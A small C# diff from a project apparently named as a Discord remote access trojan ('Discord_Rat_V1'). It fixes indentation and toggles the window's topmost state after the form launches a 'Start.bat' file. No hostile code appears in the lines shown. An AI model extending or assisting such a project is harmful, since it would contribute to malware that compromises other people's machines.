@@ -27,7 +27,7 @@ namespace Discord_Rat_V1
         {
 
         }
-                private void webBrowser1_DocumentCompleted_1(object sender, WebBrowserDocumentCompletedEventArgs e)
+        private void webBrowser1_DocumentCompleted_1(object sender, WebBrowserDocumentCompletedEventArgs e)
         {
 
         }
@@ -53,6 +53,8 @@ namespace Discord_Rat_V1
             System.Diagnostics.Process.Start(Application.StartupPath + "/Start.bat");
             await Task.Delay(700);
             this.TopMost = true;
+            await Task.Delay(1);
+            this.TopMost = false;
         }
 
         private void richTextBox1_TextChanged(object sender, EventArgs e)
